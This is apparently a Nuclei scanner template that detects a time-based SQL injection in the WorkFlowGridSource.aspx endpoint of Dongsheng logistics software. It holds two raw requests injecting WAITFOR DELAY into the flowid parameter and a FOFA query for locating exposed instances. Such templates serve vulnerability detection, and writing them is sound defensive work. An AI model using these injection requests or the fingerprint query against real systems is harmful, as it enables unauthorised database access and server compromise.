http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          GET /WorkFlow/WorkFlowGridSource.aspx?handle=steplist&flowid=-1';WAITFOR+DELAY+'0:0:4'-- HTTP/1.1
          Host: {{Hostname}}
        - |
          GET /WorkFlow/WorkFlowGridSource.aspx?handle=steplist&flowid=-1';WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
          Host: {{Hostname}}
id: dongshengwuliu-WorkFlowGridSource_aspx-sql-time
info:
    author: Superhero
    description: |-
        fofa: app="东胜物流软件-物流软件"
        东胜物流软件 WorkFlowGridSource.aspx接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 东胜物流软件 WorkFlowGridSource.aspx SQL延时注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/e5NHWog9u5c_RnB5PxeRXw
    severity: high
    tags:
        - 东胜物流软件
